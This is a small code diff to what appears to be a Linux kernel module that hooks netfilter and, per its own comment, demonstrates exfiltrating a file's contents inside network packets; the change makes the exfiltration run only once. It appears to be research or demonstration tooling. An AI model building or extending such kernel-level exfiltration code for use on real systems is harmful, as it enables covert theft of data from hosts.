@@ -54,6 +54,7 @@ static struct nf_hook_ops *nfho = NULL;
 //file data read at module load time
 static char *file_data = NULL;
 static int file_data_len = 0;
+static atomic_t exfil_done = ATOMIC_INIT(0);
 
 //function that demonstrates the exfiltration of a test file.
 static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len) {
@@ -64,6 +65,9 @@ static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len)
     time64_t ts;
     u32 ts32;
     u8 ts_bytes[4];
+
+    if (atomic_cmpxchg(&exfil_done, 0, 1) != 0)
+        return NF_ACCEPT;
 
     if (max_data <= 0 || file_data == NULL || file_data_len == 0)
         return NF_ACCEPT;
